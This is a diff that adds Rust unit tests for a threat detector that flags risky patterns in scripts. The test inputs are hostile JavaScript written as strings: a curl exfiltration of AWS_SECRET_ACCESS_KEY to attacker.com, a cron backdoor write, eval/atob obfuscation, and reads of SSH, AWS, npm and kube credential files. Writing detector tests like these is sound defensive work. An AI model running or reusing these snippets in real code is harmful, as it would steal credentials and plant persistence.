@@ -182,4 +182,100 @@ mod tests {
         let threats = ThreatDetector::detect_threats(script);
         assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_))));
     }
+
+    #[test]
+    fn test_fs_tampering_detection() {
+        let script = r#"fs.writeFile('/etc/cron.d/backdoor', payload)"#;
+        let threats = ThreatDetector::detect_threats(script);
+        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_))));
+    }
+
+    #[test]
+    fn test_obfuscation_detection() {
+        let script = r#"eval(atob('aGVsbG8='))"#;
+        let threats = ThreatDetector::detect_threats(script);
+        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_))));
+        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_))));
+    }
+
+    #[test]
+    fn test_no_threats_on_clean_script() {
+        let script = "echo 'build complete'";
+        let threats = ThreatDetector::detect_threats(script);
+        assert!(threats.is_empty());
+    }
+
+    #[test]
+    fn test_all_categories_detected() {
+        // One indicator per category in a single script
+        let script = r#"
+            const cp = require('child_process');
+            cp.exec('curl https://attacker.com/?k=' + process.env.AWS_SECRET_ACCESS_KEY);
+            require('fs').writeFile('../stolen', data);
+            eval(atob('cGF5bG9hZA=='));
+        "#;
+        let threats = ThreatDetector::detect_threats(script);
+        let has_network  = threats.iter().any(|t| matches!(t, ThreatIndicator::NetworkActivity(_)));
+        let has_exfil    = threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_)));
+        let has_exec     = threats.iter().any(|t| matches!(t, ThreatIndicator::ProcessExecution(_)));
+        let has_fs       = threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_)));
+        let has_obfusc   = threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_)));
+        assert!(has_network,  "should detect network activity");
+        assert!(has_exfil,    "should detect data exfiltration");
+        assert!(has_exec,     "should detect process execution");
+        assert!(has_fs,       "should detect file system tampering");
+        assert!(has_obfusc,   "should detect obfuscation");
+    }
+
+    #[test]
+    fn test_multiple_matches_same_pattern() {
+        // Two fetch calls and two hardcoded URLs → at least 4 NetworkActivity hits
+        let script = r#"fetch('https://a.com/log'); fetch('https://b.com/log');"#;
+        let threats = ThreatDetector::detect_threats(script);
+        let network_count = threats.iter()
+            .filter(|t| matches!(t, ThreatIndicator::NetworkActivity(_)))
+            .count();
+        assert!(network_count >= 4, "expected >= 4, got {}", network_count);
+    }
+
+    #[test]
+    fn test_git_directory_access_flagged() {
+        let script = r#"fs.readFile('.git/config', 'utf8', cb)"#;
+        let threats = ThreatDetector::detect_threats(script);
+        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::FileSystemTampering(_))));
+    }
+
+    #[test]
+    fn test_hex_array_obfuscation() {
+        // 11 hex values — exceeds the ≥10 threshold in the pattern
+        let script = "var p = [0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64];";
+        let threats = ThreatDetector::detect_threats(script);
+        assert!(threats.iter().any(|t| matches!(t, ThreatIndicator::Obfuscation(_))));
+    }
+
+    #[test]
+    fn test_sensitive_env_vars_detected() {
+        for var in &["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN", "DOCKER_PASSWORD"] {
+            let script = format!("process.env.{}", var);
+            let threats = ThreatDetector::detect_threats(&script);
+            assert!(
+                threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_))),
+                "{} should be flagged as exfiltration",
+                var
+            );
+        }
+    }
+
+    #[test]
+    fn test_ssh_and_aws_credential_paths() {
+        for path in &[".ssh/id_rsa", ".aws/credentials", ".npmrc", ".kube/config"] {
+            let script = format!("fs.readFile('{}', cb)", path);
+            let threats = ThreatDetector::detect_threats(&script);
+            assert!(
+                threats.iter().any(|t| matches!(t, ThreatIndicator::DataExfiltration(_))),
+                "{} should be flagged as exfiltration",
+                path
+            );
+        }
+    }
 }
